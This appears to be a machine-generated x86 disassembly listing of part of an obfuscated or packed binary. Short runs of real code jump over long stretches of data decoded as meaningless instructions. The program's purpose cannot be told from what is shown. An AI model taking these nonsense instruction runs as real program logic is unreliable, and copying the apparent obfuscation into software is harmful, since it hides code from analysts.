  407b78:	mov    DWORD PTR ds:0x43383b,0x844
  407b82:	mov    ecx,DWORD PTR [ebp+0x8]
  407b85:	mov    DWORD PTR ds:0x4337fb,0x1c5f
  407b8f:	mov    DWORD PTR [ecx],eax
  407b91:	jmp    0x407ee8
  407b96:	jmp    0x407ee1
  407b9b:	dec    eax
  407b9c:	sbb    dh,BYTE PTR [ebx-0x16]
  407b9f:	jno    0x407c14
  407ba1:	push   ecx
  407ba2:	cwde   
  407ba3:	mov    ds:0xfcf6a3a4,al
  407ba8:	cmp    DWORD PTR [esi+0x7ecb78c3],0x7e
  407baf:	and    BYTE PTR [ebp+0x7e],bh
  407bb2:	jle    0x407bf7
  407bb4:	in     eax,0x32
  407bb6:	retf   0x769c
  407bb9:	xchg   ebp,eax
  407bba:	dec    edi
  407bbb:	imul   edi,DWORD PTR [ecx-0x68],0x2e
  407bbf:	test   al,0x4f
  407bc1:	adc    DWORD PTR [edx],esp
  407bc3:	inc    ebx
  407bc4:	pop    ecx
  407bc5:	jg     0x407bbe
  407bc7:	loope  0x407be2
  407bc9:	or     ah,dl
  407bcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bcc:	mov    ecx,0x769b6898
  407bd1:	jb     0x407c10
  407bd3:	xchg   edx,eax
  407bd4:	mov    bh,0x4b
  407bd6:	ss push es
  407bd8:	out    0x78,eax
  407bda:	sub    ch,BYTE PTR [ecx-0x2d1dd7f4]
  407be0:	les    ebx,FWORD PTR [esi+0x2f580d1d]
  407be6:	fsub   QWORD PTR [esi+edi*1]
  407be9:	repz push cs
  407beb:	ds sub al,0xf6
  407bee:	ret    0x17b0
  407bf1:	fld    QWORD PTR [edx+0x59]
  407bf4:	xchg   esp,eax
  407bf5:	jge    0x407bf4
  407bf7:	hlt    
  407bf8:	in     al,0x99
  407bfa:	adc    al,0x3d
  407bfc:	mov    dh,BYTE PTR [edi+0x40b6ece5]
  407c02:	add    cl,cl
  407c04:	mov    ds:0xc98621ad,al
  407c09:	sbb    ah,cl
  407c0b:	mov    al,ds:0x23412e13
  407c10:	sbb    DWORD PTR ds:0x812a732b,ebp
  407c16:	sahf   
  407c17:	push   ecx
  407c18:	pop    eax
  407c19:	std    
  407c1a:	push   0x2f
  407c1c:	and    al,0x20
  407c1e:	add    DWORD PTR [edx],edx
  407c20:	pop    esp
  407c21:	mov    cl,0x70
  407c23:	nop
  407c24:	scas   eax,DWORD PTR es:[edi]
  407c25:	mov    ecx,0x5ea5b39a
  407c2a:	dec    edi
  407c2b:	(bad)  
  407c2c:	mov    eax,ds:0x1c7c0d8
  407c31:	mov    ds:0x718e1097,eax
  407c36:	loope  0x407c2e
  407c38:	js     0x407c55
  407c3a:	xor    dl,bh
  407c3c:	test   al,0xd9
  407c3e:	imul   DWORD PTR [ecx-0x5e]
  407c41:	mov    ds:0xf3d5f418,al
  407c46:	mov    al,0xd6
  407c48:	xchg   edx,eax
  407c49:	or     DWORD PTR [ebx],edx
  407c4b:	in     eax,0x59
  407c4d:	icebp  
  407c4e:	or     BYTE PTR [edi+ebx*4-0x4d850450],al
  407c55:	cmc    
  407c56:	xor    DWORD PTR [edi-0x1a],esp
  407c59:	cli    
  407c5a:	sub    ecx,esi
  407c5c:	sbb    eax,0xa6ec369e
  407c61:	xchg   ebx,eax
  407c62:	cs mov ebp,0x6ad6907
  407c68:	push   0x5f9996fd
  407c6d:	rcr    BYTE PTR [esi],cl
  407c6f:	retf   
  407c70:	lods   eax,DWORD PTR ds:[esi]
  407c71:	fdivr  DWORD PTR [edi]
  407c73:	dec    edx
  407c74:	mov    cl,0x8f
  407c76:	push   eax
  407c77:	xchg   ebx,eax
  407c78:	out    dx,al
  407c79:	xor    ecx,ecx
  407c7b:	ins    DWORD PTR es:[edi],dx
  407c7c:	mov    dl,0x3f
  407c7e:	out    0xed,al
  407c80:	out    0xab,al
  407c82:	xor    ch,BYTE PTR [ecx]
  407c84:	jne    0x407c26
  407c86:	pop    esi
  407c87:	mov    ds:0xde91dd18,eax
  407c8c:	push   ds
  407c8d:	xor    DWORD PTR [ebp-0x4f],eax
  407c90:	xor    ebx,ebx
  407c92:	ins    BYTE PTR es:[edi],dx
  407c93:	dec    edi
  407c94:	push   ebx
  407c95:	sahf   
  407c96:	sub    edi,esi
  407c98:	aaa    
  407c99:	or     dl,dh
  407c9b:	sbb    al,0xe9
  407c9d:	push   es
  407c9e:	clc    
  407c9f:	(bad)  
  407ca1:	js     0x407c55
  407ca3:	addr16 leave 
  407ca5:	test   ah,dh
  407ca7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ca8:	into   
  407ca9:	inc    ebp
  407caa:	outs   dx,DWORD PTR ds:[esi]
  407cab:	arpl   WORD PTR [edx-0x584c8a82],cx
  407cb1:	xor    DWORD PTR [edi-0x402adf5e],esp
  407cb7:	mov    edi,0x72b3b8ee
  407cbc:	rol    ah,cl
  407cbe:	jle    0x407ca1
  407cc0:	mov    cl,0xf6
  407cc2:	mov    dl,0x80
  407cc4:	push   ebp
  407cc5:	mov    al,0x4d
  407cc7:	adc    eax,0x695c2238
  407ccc:	(bad)  
  407ccd:	jne    0x407c59
  407ccf:	mov    edi,eax
  407cd1:	ds mov ebp,0xe322b42c
  407cd7:	jle    0x407cf1
  407cd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cda:	xor    edx,edi
  407cdc:	in     al,0x58
  407cde:	jmp    0x8c210cba
  407ce3:	fsub   st,st(4)
  407ce5:	jp     0x407cbd
  407ce7:	(bad)
  407cea:	jbe    0x407cd6
  407cec:	dec    eax
  407ced:	pop    edi
  407cee:	sub    DWORD PTR [eax],edi
  407cf0:	pushf  
  407cf1:	mov    dh,dl
  407cf3:	int    0xaf
  407cf5:	cld    
  407cf6:	imul   edx,esi,0xb8bfaa47
  407cfc:	ss test edi,0x77ea96e7
  407d03:	fistp  WORD PTR [ecx+ebx*1+0x2e31357]
  407d0a:	xchg   edi,eax
  407d0b:	mov    dh,BYTE PTR ds:0x39a70066
  407d11:	jl     0x407d59
  407d13:	cmp    eax,0x9c392cc3
  407d18:	mov    bh,0x7e
  407d1a:	aam    0xb8
  407d1c:	inc    esi
  407d1d:	mov    edx,0x58194628
  407d22:	mov    eax,ds:0x6144f240
  407d27:	sbb    DWORD PTR [edx+0x2c],esp
  407d2a:	mov    edi,0x1296cc67
  407d2f:	cmp    eax,0xaa2c612f
  407d34:	jecxz  0x407d6e
  407d36:	xchg   DWORD PTR [ebx],edi
  407d38:	cmp    ecx,DWORD PTR [ebx]
  407d3a:	add    eax,0xda3feb87
  407d3f:	ins    DWORD PTR es:[edi],dx
  407d40:	or     esp,edx
  407d42:	les    eax,FWORD PTR [edx-0x5bcbf3af]
  407d48:	sbb    al,0x88
  407d4a:	push   0x8aa5b4d0
  407d4f:	clc    
  407d50:	scas   eax,DWORD PTR es:[edi]
  407d51:	out    dx,al
  407d52:	ja     0x407d7e
  407d54:	call   0x3cf2:0xddff8663
  407d5b:	mov    WORD PTR [ebx-0x7c8ac0ba],cs
  407d61:	xor    al,BYTE PTR [eax+0x57]
  407d64:	or     ebx,DWORD PTR [eax-0x6286c60d]
  407d6a:	sub    dh,0x4
  407d6d:	adc    al,0x97
  407d6f:	and    DWORD PTR [ecx-0x25],esi
  407d72:	bound  ecx,QWORD PTR [ebx]
  407d74:	loopne 0x407da3
  407d76:	in     al,dx
  407d77:	mov    edx,0xdbe3319c
  407d7c:	inc    BYTE PTR [ebp-0x7b]
  407d7f:	fsub   QWORD PTR [ecx]
  407d81:	push   eax
  407d82:	push   ds
  407d83:	add    eax,0x5addbf40
  407d88:	std    
  407d89:	mov    dh,0x79
  407d8b:	int    0xe
  407d8d:	dec    esp
  407d8e:	push   es
  407d8f:	jg     0x407dbc
  407d91:	retf   0x7f4
  407d94:	fstp   QWORD PTR [ecx]
  407d96:	test   eax,0xef056ff2
  407d9b:	enter  0xaf31,0x6
  407d9f:	add    ecx,DWORD PTR [edx+0x1d]
  407da2:	xchg   edi,eax
  407da3:	in     eax,dx
  407da4:	or     DWORD PTR [ecx-0x2a],edx
  407da7:	push   edx
  407da8:	inc    eax
  407da9:	lods   eax,DWORD PTR ds:[esi]
  407daa:	pop    esi
  407dab:	push   ebx
  407dac:	ds mov eax,0xd6e4fb8e
  407db2:	mov    cl,0xc5
  407db4:	fistp  QWORD PTR [esi]
  407db6:	sbb    edx,DWORD PTR [ecx]
  407db8:	(bad)
  407dbb:	ret    
  407dbc:	inc    edx
  407dbd:	stc    
  407dbe:	push   edi
  407dbf:	pop    esp
  407dc0:	ins    BYTE PTR es:[edi],dx
  407dc1:	jno    0x407d6f
  407dc3:	leave  
  407dc4:	xchg   BYTE PTR [ebx+0x7c3e846],bl
  407dca:	pop    ebp
  407dcb:	cmp    cl,BYTE PTR [eax+0x72]
  407dce:	aam    0x4d
  407dd0:	add    DWORD PTR [ecx*4+0x114f0807],esi
  407dd7:	into   
  407dd8:	xlat   BYTE PTR fs:[ebx]
  407dda:	jns    0x407e23
  407ddc:	test   eax,0x7d202c79
  407de1:	jp     0x407dc5
  407de3:	movntps XMMWORD PTR [eax-0x2cc7c34a],xmm1
  407dea:	mov    bh,0x19
  407dec:	mov    edx,0x8dd5b0d1
  407df1:	lds    eax,FWORD PTR [ebx+0x72f76b48]
  407df7:	inc    ebp
  407df8:	xchg   BYTE PTR [eax+0x5d31604d],bh
  407dfe:	push   edx
  407dff:	sbb    eax,0x8b911ab
  407e04:	push   esp
  407e05:	outs   dx,DWORD PTR ds:[esi]
  407e06:	jmp    0x407e71
  407e08:	jp     0x407dde
  407e0a:	jo     0x407e1a
  407e0c:	inc    ebp
  407e0d:	sbb    BYTE PTR [ebp+0x56],cl
  407e10:	outs   dx,DWORD PTR ds:[esi]
  407e11:	dec    ebp
  407e12:	push   0xee47348a
  407e17:	test   BYTE PTR [eax+0x62a4302c],bh
  407e1d:	sub    al,0xa
  407e1f:	aaa    
  407e20:	bound  eax,QWORD PTR [edi-0x65]
  407e23:	jecxz  0x407dc5
  407e25:	call   0xc45efe36
  407e2a:	or     dh,cl
  407e2c:	cdq    
  407e2d:	sub    DWORD PTR [edx],ebx
  407e2f:	mov    eax,ds:0xcdb9a817
  407e34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e35:	and    DWORD PTR [ecx],0x735bdf9e
  407e3b:	xchg   edi,eax
  407e3c:	ds fwait
  407e3e:	push   ds
  407e3f:	ror    BYTE PTR [ecx+0x71],cl
  407e42:	(bad)  
  407e43:	rol    DWORD PTR [ebx],0xf1
  407e46:	je     0x407e4a
  407e48:	dec    ebx
  407e49:	pop    ds
  407e4a:	add    eax,0xaa1738cb
  407e4f:	inc    eax
  407e50:	pushf  
  407e51:	jmp    0x407e83
  407e53:	fs scas eax,DWORD PTR es:[edi]
  407e55:	or     edi,ecx
  407e57:	push   ss
  407e58:	push   ecx
  407e59:	push   0x79
  407e5b:	cdq    
  407e5c:	push   ecx
  407e5d:	adc    eax,0x54150770
  407e62:	dec    ebx
  407e63:	retf   
  407e64:	adc    BYTE PTR [eax-0x14],cl
  407e67:	popf   
  407e68:	xor    cl,BYTE PTR [edi-0x42]
  407e6b:	sub    bh,dl
  407e6d:	fild   WORD PTR [ebp-0x5f]
  407e70:	push   es
  407e71:	dec    edi
  407e72:	outs   dx,BYTE PTR ds:[esi]
  407e73:	fbld   TBYTE PTR [edi-0x1b7dac0a]
  407e79:	in     eax,dx
  407e7a:	ret    
  407e7b:	scas   al,BYTE PTR es:[edi]
  407e7c:	mov    dl,0xf0
  407e7e:	fld    DWORD PTR [edi]
  407e80:	adc    eax,edi
  407e82:	push   esp
  407e83:	mov    gs,WORD PTR [edx]
  407e85:	mov    eax,0x8e86c85f
  407e8a:	test   al,0xf9
  407e8c:	mov    eax,0xc6f8b646
  407e91:	sbb    dl,BYTE PTR [ecx+0x44]
  407e94:	mov    dl,0x50
  407e96:	scas   eax,DWORD PTR es:[edi]
  407e97:	leave  
  407e98:	mov    dl,BYTE PTR [edx-0x45dca621]
  407e9e:	inc    ebx
  407e9f:	or     BYTE PTR [ebp+0x3e],ah
  407ea2:	xchg   edx,eax
  407ea3:	hlt    
  407ea4:	and    ch,ch
  407ea6:	or     dh,BYTE PTR [ebx+eax*8]
  407ea9:	add    esi,DWORD PTR [esi+edi*8+0x1cffc969]
  407eb0:	gs iret 
  407eb2:	gs sub al,0xd0
  407eb5:	mov    ah,0x57
  407eb7:	and    al,0x93
  407eb9:	ss add al,0x35
  407ebc:	jns    0x407ec0
  407ebe:	xor    eax,0x519e7490
  407ec3:	pop    ebp
  407ec4:	rdpmc  
  407ec6:	popa   
  407ec7:	rol    esi,1
  407ec9:	jno    0x407e4c
  407ecb:	sub    bh,BYTE PTR [esi-0x72]
  407ece:	and    al,BYTE PTR [edi+ecx*2-0x37]
  407ed2:	sbb    eax,DWORD PTR [esi]
  407ed4:	aas    
  407ed5:	arpl   bx,bp
  407ed7:	dec    esi
  407ed8:	in     eax,0xd3
  407eda:	pop    ss
  407edb:	mov    DWORD PTR [eax+0xc6dff8c],esp
  407ee1:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  407ee8:	mov    ax,WORD PTR [ebp-0x8]
  407eec:	push   DWORD PTR [ebp+0x8]
  407eef:	call   0x407f00
  407ef4:	test   eax,eax
  407ef6:	je     0x407ee1
  407efc:	leave  
  407efd:	ret    0x4
  407f00:	push   ebp
  407f01:	mov    ebp,esp
  407f03:	sub    esp,0x2c
  407f06:	or     DWORD PTR ds:0x43376f,edi
  407f0c:	jmp    0x408093
  407f11:	outs   dx,DWORD PTR ds:[esi]
  407f12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f13:	ins    BYTE PTR es:[edi],dx
  407f14:	inc    edi
  407f15:	jne    0x407f6c
  407f17:	jne    0x407ecf
  407f19:	push   ss
  407f1a:	push   ds
  407f1b:	mov    ch,0xcc
  407f1d:	leave  
  407f1e:	mov    ebp,0xd62a7cca
  407f23:	jle    0x407fa3
  407f25:	in     al,0x7f
  407f27:	jle    0x407fa7
  407f29:	fwait
  407f2a:	aam    0x71
  407f2c:	xchg   ecx,eax
  407f2d:	xchg   ecx,eax
  407f2e:	cmp    BYTE PTR [ecx],cl
  407f30:	cdq    
  407f31:	in     eax,0xd2
  407f33:	(bad)  
  407f34:	push   eax
  407f35:	and    al,0xdc
  407f37:	retf   
  407f38:	pop    ecx
  407f39:	dec    ebp
  407f3a:	mov    ebp,edx
  407f3c:	out    0x20,eax
  407f3e:	fiadd  DWORD PTR [edi+0x59]
  407f41:	pop    esp
  407f42:	xor    BYTE PTR [eax],bh
  407f44:	jnp    0x407f9b
  407f46:	jge    0x407f3a
  407f48:	mov    dh,ah
  407f4a:	mov    ch,0xcb
  407f4c:	fldpi  
  407f4e:	jbe    0x407f5b
  407f50:	sub    ch,al
  407f52:	mov    ah,0x40
  407f54:	pop    es
  407f55:	jnp    0x407f64
  407f57:	jb     0x407fb1
  407f59:	mov    bl,0xc2
  407f5b:	mov    dh,0x90
  407f5d:	cmc    
  407f5e:	out    0xaf,eax
  407f60:	popa   
  407f61:	out    dx,al
  407f62:	sub    ch,0xd
  407f65:	dec    edx
  407f66:	fmul   DWORD PTR [ebx-0x3c]
  407f69:	aam    0xa
  407f6b:	push   ss
  407f6c:	lods   al,BYTE PTR ds:[esi]
  407f6d:	sbb    esi,ebx
  407f6f:	je     0x407fcf
  407f71:	out    0xec,al
  407f73:	das    
  407f74:	dec    esi
  407f75:	dec    ebp
  407f76:	out    dx,eax
  407f77:	rol    DWORD PTR [ebx+eiz*4+0x6b471507],1
  407f7e:	push   0x23ae8a72
  407f83:	cdq    
  407f84:	xor    al,0xef
  407f86:	pop    ebp
  407f87:	lea    edx,[edx]
  407f89:	or     al,0x21
  407f8b:	mov    BYTE PTR [esi-0x481bdc60],al
  407f91:	sub    BYTE PTR [eax+0x492fef00],0x26
  407f98:	mov    esi,0xdb880317
  407f9d:	pop    esi
  407f9e:	cmp    bh,BYTE PTR [ebp-0x60]
  407fa1:	sub    ch,dh
  407fa3:	mov    ds:0x2f391fab,al
  407fa8:	cmp    esi,DWORD PTR [ebx+eiz*1-0x7f40feee]
  407faf:	cmp    eax,0x2bfa1a23
  407fb4:	cwde   
  407fb5:	push   esi
  407fb6:	jmp    0xbec7:0xe8987f70
  407fbd:	stos   BYTE PTR es:[edi],al
  407fbe:	adc    al,0x4b
  407fc0:	mov    DWORD PTR [ebx],0x8e8b496d
  407fc6:	push   ss
  407fc7:	jnp    0x408003
  407fc9:	fwait
  407fca:	xchg   DWORD PTR [ebx+0x6b],ecx
  407fcd:	jno    0x407f56
  407fcf:	pop    ds
  407fd0:	es (bad) 
  407fd2:	std    
  407fd3:	xchg   esp,eax
  407fd4:	sub    DWORD PTR [ebx+0x428e1ba0],edx
  407fda:	and    eax,0x4c154bf2
  407fdf:	(bad)
  407fe2:	jnp    0x40803d
  407fe4:	or     DWORD PTR [edx],0x44
  407fe7:	shr    DWORD PTR [ebp-0x45],cl
  407fea:	xor    ah,0x58
  407fed:	stc    
  407fee:	outs   dx,BYTE PTR ds:[esi]
  407fef:	mov    esp,0xe516d23f
  407ff4:	aad    0x1b
  407ff6:	call   0xd795012a
  407ffb:	iret   
  407ffc:	test   DWORD PTR [edx-0x2f502744],0xd90fa6e9
  408006:	js     0x407fed
  408008:	aaa    
  408009:	imul   esp,DWORD PTR [ebp-0x71e12339],0xb8f3cc95
  408013:	mov    ch,0x57
  408015:	adc    eax,0xcae872a
  40801a:	repnz mov dl,al
  40801d:	lock mov dl,0x15
  408020:	popf   
  408021:	adc    al,bh
  408023:	mov    ecx,0x829bc63c
  408028:	sti    
  408029:	in     al,0xc5
  40802b:	sbb    BYTE PTR [ecx+0x5f756e9],bh
  408031:	mov    BYTE PTR [edx+0x768fb03d],bh
  408037:	rol    BYTE PTR [eax],0x9
  40803a:	into   
  40803b:	call   0xa9d655ec
  408040:	test   eax,0xb47a2a35
  408045:	cdq    
  408046:	pop    esi
  408047:	out    dx,al
  408048:	add    al,BYTE PTR [ebx-0xcea8e03]
  40804e:	(bad)  
  40804f:	fst    DWORD PTR [eax+0x41b74a73]
  408055:	idiv   DWORD PTR ds:0x1023368d
  40805b:	sub    DWORD PTR [eax+0x4356c3fd],ecx
  408061:	in     eax,0x17
  408063:	jg     0x408064
  408065:	xor    eax,0x49868ae2
  40806a:	jmp    0x289024ec
  40806f:	and    al,0x60
  408071:	test   DWORD PTR [eax+0x6e5033ce],eax
  408077:	ins    DWORD PTR es:[edi],dx
  408078:	mov    bl,0x81
  40807a:	jl     0x40809d
  40807c:	sub    DWORD PTR es:[edx-0x7a8f9060],ecx
  408083:	ins    BYTE PTR es:[edi],dx
  408084:	jmp    0x5dd0a75c
  408089:	adc    eax,0x7c3169ff
  40808e:	xor    BYTE PTR [edx-0x4],bl
  408091:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408092:	cmp    edi,eax
  408094:	inc    ebp
  408095:	clc    
  408096:	xor    al,BYTE PTR [ebp-0x38be0764]
  40809c:	inc    ebp
  40809d:	in     al,dx
  40809e:	xor    DWORD PTR [ebp+0x77b8f89c],eax
  4080a4:	xchg   ebp,eax
  4080a5:	add    BYTE PTR [eax],al
  4080a7:	mov    ecx,DWORD PTR ds:0x433727
  4080ad:	xor    DWORD PTR ds:0x433833,ecx
  4080b3:	mov    WORD PTR [ebp-0x4],ax
  4080b7:	inc    DWORD PTR ds:0x433837
  4080bd:	lea    eax,[ebp-0x24]
  4080c0:	mov    DWORD PTR [ebp-0x28],eax
  4080c3:	sbb    ecx,0x45b9
  4080c9:	mov    eax,DWORD PTR [ebp+0x8]
  4080cc:	mov    DWORD PTR [ebp-0x20],eax
  4080cf:	push   ebx
  4080d0:	movzx  ecx,WORD PTR ds:0x4337fb
  4080d7:	add    ecx,DWORD PTR ds:0x43371b
  4080dd:	mov    DWORD PTR ds:0x4337fb,ecx
  4080e3:	lea    eax,[ebp-0x18]
  4080e6:	mov    DWORD PTR [ebp-0x1c],eax
  4080e9:	mov    eax,DWORD PTR [ebp-0x1c]
  4080ec:	and    DWORD PTR ds:0x433767,edx
  4080f2:	push   esi
  4080f3:	or     DWORD PTR ds:0x433783,ebx
  4080f9:	push   edi
  4080fa:	add    DWORD PTR ds:0x43371f,ebx
  408100:	mov    edi,0xf89f2da9
  408105:	mov    DWORD PTR [eax],edi
  408107:	and    DWORD PTR ds:0x4337b3,0x0
  408111:	jmp    0x408121
  408116:	mov    eax,ds:0x4337b3
  40811b:	inc    eax
  40811c:	mov    ds:0x4337b3,eax
  408121:	cmp    DWORD PTR ds:0x4337b3,0x11
  408128:	jae    0x408163
  40812e:	cmp    DWORD PTR ds:0x4337b3,0x4
  408135:	jne    0x408146
  40813b:	push   0x1543
  408140:	call   DWORD PTR ds:0x412390
  408146:	cmp    DWORD PTR ds:0x4337b3,0x3
  40814d:	jne    0x40815e
  408153:	mov    eax,ds:0x4337b3
  408158:	inc    eax
  408159:	mov    ds:0x4337b3,eax
  40815e:	jmp    0x408116
  408163:	mov    eax,DWORD PTR [ebp-0x14]
  408166:	mov    ebx,DWORD PTR [ebp-0x8]
  408169:	mov    ecx,0x7510854
  40816e:	mov    DWORD PTR ds:0x43376b,0x500e
  408178:	jmp    0x4082ff
  40817d:	xor    dl,BYTE PTR [esi+0x23]
  408180:	inc    edi
  408181:	arpl   WORD PTR [ebx+0x72],si
  408184:	jae    0x408123
  408186:	aas    
  408187:	or     eax,0x1ebca38b
  40818c:	push   edi
  40818d:	nop
  40818e:	xlat   BYTE PTR ds:[ebx]
  40818f:	jle    0x40820f
  408191:	in     al,0x7f
  408193:	jle    0x408213
  408195:	ds shl bh,cl
  408198:	not    DWORD PTR [edx+0x3a]
  40819b:	lea    edi,[edx+edx*8+0x541c17fb]
  4081a2:	inc    edi
  4081a3:	push   edx
  4081a4:	cs leave 
  4081a6:	daa    
  4081a7:	lods   eax,DWORD PTR ds:[esi]
  4081a8:	ss dec ebp
  4081aa:	sbb    BYTE PTR [esi+0x6b7aaa66],al
  4081b0:	xchg   ebp,eax
  4081b1:	xlat   BYTE PTR ds:[ebx]
  4081b2:	jp     0x408194
  4081b4:	fnstcw WORD PTR [ecx]
  4081b6:	and    eax,0x42e8f9c9
  4081bb:	push   esi
  4081bc:	pushf  
  4081bd:	add    eax,0xf19a9a21
  4081c2:	stos   BYTE PTR es:[edi],al
  4081c3:	cmp    bl,al
  4081c5:	push   esp
  4081c6:	enter  0x54b1,0xd5
  4081ca:	(bad)  
  4081cb:	pop    edi
  4081cc:	mov    ds:0x49472d26,eax
  4081d1:	xchg   dh,dl
  4081d3:	mov    al,BYTE PTR [edi-0x439f3528]
  4081d9:	push   ss
  4081da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081db:	mov    ch,0xb
  4081dd:	std    
  4081de:	or     DWORD PTR [ecx+edi*1],ecx
  4081e1:	scas   eax,DWORD PTR es:[edi]
  4081e2:	fwait
  4081e3:	shr    DWORD PTR [ebp+edx*1+0x3f],cl
  4081e7:	inc    edi
  4081e8:	jns    0x4081e7
  4081ea:	pop    ecx
  4081eb:	xor    al,0xef
  4081ed:	outs   dx,DWORD PTR ds:[esi]
  4081ee:	xchg   ebp,eax
  4081ef:	std    
  4081f0:	jne    0x408206
  4081f2:	xchg   ecx,eax
  4081f3:	and    edi,DWORD PTR [ebx+ebx*2]
  4081f6:	and    esi,DWORD PTR ds:0x76dc7abd
  4081fc:	cli    
  4081fd:	mov    edx,0x74fffe91
  408202:	sub    esi,esi
  408204:	rcr    ecx,1
  408206:	jbe    0x408258
  408208:	xchg   edx,eax
  408209:	aam    0xc5
  40820b:	ret    
  40820c:	repnz sbb al,0x4c
  40820f:	push   ecx
  408210:	adc    DWORD PTR ds:0xe9c6d0a9,ebx
  408216:	dec    edi
  408217:	cmp    DWORD PTR [eax+0x5c683d9c],edi
  40821d:	test   ebx,ebx
  40821f:	and    ecx,DWORD PTR [edx]
  408221:	les    ebx,FWORD PTR [ebx+0x4a211722]
  408227:	shl    BYTE PTR ds:0x993c6549,0x3b
  40822e:	pop    es
  40822f:	sar    BYTE PTR [ecx],cl
  408231:	push   cs
  408232:	std    
  408233:	sbb    DWORD PTR [ebp+0x64754705],esp
  408239:	jp     0x408228
  40823b:	mov    ebp,0xacf5aff2
  408240:	out    dx,eax
  408241:	inc    eax
  408242:	push   esi
  408243:	add    DWORD PTR [eax],ecx
  408245:	rol    DWORD PTR [eax+0x4c966d48],0xd0
  40824c:	es mov edx,0x87960fb1
  408252:	stos   BYTE PTR es:[edi],al
  408253:	or     BYTE PTR [esp+edi*4],bh
  408256:	stos   DWORD PTR es:[edi],eax
  408257:	dec    edx
  408258:	(bad)  
  40825a:	int3   
  40825b:	xchg   ebx,eax
  40825c:	out    0xbf,al
  40825e:	ja     0x408232
  408260:	pusha  
  408261:	xchg   ebx,eax
  408262:	test   DWORD PTR [eax+edx*2+0x1fd5c89b],edx
  408269:	retf   0x3df3
  40826c:	bound  ecx,QWORD PTR [edi]
  40826e:	lea    ebx,[ecx+0x79]
  408271:	jbe    0x408222
  408273:	daa    
  408274:	ret    
  408275:	pusha  
  408276:	out    0x2a,eax
  408278:	test   al,0x46
  40827a:	(bad)  
  40827b:	adc    BYTE PTR [ebp+0x4575d38e],bh
  408281:	in     al,dx
  408282:	test   al,ah
  408284:	inc    edx
  408285:	pop    ecx
  408286:	pop    eax
  408287:	adc    esp,edx
  408289:	and    BYTE PTR [ebx-0x5a],0x52
  40828d:	mov    ah,0x21
  40828f:	retf   
  408290:	adc    DWORD PTR [edx+0x12],edi
  408293:	cwde   
  408294:	jns    0x408293
  408296:	mov    eax,0xfb33309
  40829b:	push   esp
  40829c:	popa   
  40829d:	push   esi
  40829e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40829f:	loop   0x408301
  4082a1:	(bad)  
  4082a3:	dec    eax
  4082a4:	jmp    0x408267
  4082a6:	mov    ah,BYTE PTR [esi-0x5c68221c]
  4082ac:	cmp    al,0x66
  4082ae:	mov    edx,0x4e2a403f
  4082b3:	mov    ?,WORD PTR [edi+0x26]
  4082b6:	jno    0x40829d
  4082b8:	sbb    BYTE PTR [eax-0x262cbb70],cl
  4082be:	inc    edx
  4082bf:	dec    edi
  4082c0:	and    DWORD PTR [esi-0x7ce44469],esi
  4082c6:	cli    
  4082c7:	stos   BYTE PTR es:[edi],al
  4082c8:	mov    ah,ah
  4082ca:	mov    ch,0x90
  4082cc:	call   0x2d21:0x84551296
  4082d3:	mov    ch,0x5c
  4082d5:	jno    0x4082ba
  4082d7:	and    al,0x46
  4082d9:	lea    esp,[ebp-0x37]
  4082dc:	call   0x71a6f1f3
  4082e1:	sbb    ebx,DWORD PTR fs:[edx-0x8]
  4082e5:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4082e7:	es sub al,0x73
  4082ea:	enter  0x4c06,0x32
  4082ee:	int    0x33
  4082f0:	mov    cl,0x43
  4082f2:	dec    edi
  4082f3:	loopne 0x4082ac
  4082f5:	mov    ah,0xbb
  4082f7:	out    0x6a,al
  4082f9:	jge    0x4082e6
  4082fb:	test   eax,0x33651171
  408300:	rol    DWORD PTR [ecx+0x43377f25],0x0
  408307:	jo     0x40831c
  408309:	add    BYTE PTR [eax],al
  40830b:	mov    esi,0x32729b
  408310:	add    DWORD PTR ds:0x433723,0x35ec
  40831a:	xor    ebx,ecx
  40831c:	xor    DWORD PTR ds:0x4337af,0x433843
  408326:	xor    edx,edx
  408328:	add    DWORD PTR ds:0x4337bf,0x300c
  408332:	add    eax,esi
  408334:	add    ebx,esi
  408336:	div    ebx
  408338:	mov    DWORD PTR ds:0x43377b,0x2005
  408342:	mov    edx,DWORD PTR [ebp-0x20]
  408345:	mov    DWORD PTR ds:0x43371b,0x2cd7
  40834f:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  408356:	mov    DWORD PTR ds:0x4337ff,0x77f0
  408360:	cmp    eax,DWORD PTR [edx]
  408362:	mov    DWORD PTR ds:0x433773,0x5769
  40836c:	jmp    0x4084f3
  408371:	or     ebx,ecx
  408373:	add    DWORD PTR [ecx+eax*8],ecx
  408376:	aam    0x11
  408378:	retf   
  408379:	imul   esp,edx,0xffffffd8
  40837c:	mov    eax,0xff1d427f
  408381:	push   es
  408382:	aad    0x7e
  408384:	jle    0x40836a
  408386:	jg     0x408406
  408388:	jle    0x40831b
  40838a:	jae    0x40840a
  40838c:	inc    esi
  40838d:	popf   
  40838e:	xchg   DWORD PTR [edx-0x5195c493],esi
  408394:	pop    edi
  408395:	mov    WORD PTR ds:0xb7b495d1,fs
  40839b:	(bad)  
  40839c:	out    dx,al
  40839d:	outs   dx,DWORD PTR ds:[esi]
  40839e:	inc    ecx
  40839f:	lea    esp,[ebp-0x78]
  4083a2:	add    dl,ah
  4083a4:	inc    edx
  4083a5:	lods   eax,DWORD PTR ds:[esi]
  4083a6:	xor    DWORD PTR [ebx-0x42],edi
  4083a9:	push   eax
  4083aa:	and    BYTE PTR [eax-0x26e741d7],ch
  4083b0:	or     dl,ch
  4083b2:	loop   0x4083ab
  4083b4:	dec    esi
  4083b5:	cwde   
  4083b6:	(bad)  
  4083b7:	push   ds
  4083b8:	mov    ebp,0x1340cab3
  4083bd:	jo     0x408411
  4083bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083c0:	jno    0x408373
  4083c2:	sub    DWORD PTR [edx-0x63d015e3],0xef3741fc
  4083cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083cd:	jecxz  0x408355
  4083cf:	pop    edi
  4083d0:	pop    ebx
